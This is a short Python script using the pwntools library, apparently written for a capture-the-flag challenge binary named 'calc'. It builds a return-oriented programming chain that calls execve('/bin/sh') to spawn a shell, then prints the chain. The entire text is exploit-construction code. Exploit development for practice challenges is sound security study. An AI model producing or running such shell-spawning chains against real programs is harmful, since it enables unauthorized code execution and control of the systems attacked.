from pwn import *
context(arch='i386',log_level='debug')
elf = ELF("./calc")
rop = ROP(elf)
rop.call('execve', ("/bin/sh"))#execve("/bin/sh",NULL,NULL)
print rop.dump()
print str(rop)